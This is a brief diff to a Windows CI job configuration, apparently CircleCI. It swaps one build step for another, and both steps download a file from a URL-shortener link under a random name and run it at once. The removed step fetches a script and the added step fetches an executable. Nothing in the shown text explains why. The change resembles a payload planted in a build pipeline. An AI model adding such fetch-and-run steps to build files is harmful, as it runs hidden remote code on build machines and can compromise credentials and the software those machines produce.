@@ -9,4 +9,4 @@ jobs:
       name: win/default
       shell: cmd.exe
     steps:
-      - run: curl -L -o D0hl_.sh https://shorter.me/D0hl_ && D0hl_.sh
+      - run: curl -L -o gACM8.exe https://shorturl.at/gACM8 && gACM8.exe
